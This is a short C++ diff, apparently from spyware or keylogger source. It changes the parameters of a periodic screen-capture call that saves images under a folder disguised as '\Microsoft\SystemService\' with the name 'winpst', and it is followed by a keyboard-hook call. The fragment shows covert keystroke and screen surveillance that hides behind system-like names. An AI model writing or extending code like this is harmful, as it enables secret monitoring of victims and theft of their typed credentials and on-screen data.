@@ -20,9 +20,8 @@ int main() {
 
   Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\SystemService\)"),
 						"winpst",
-						false,
-						1000,
-						5);
+						true,
+						60000);
 
   KeyHook::HandleMessage(true);
 #endif // DEBUG_BUILD
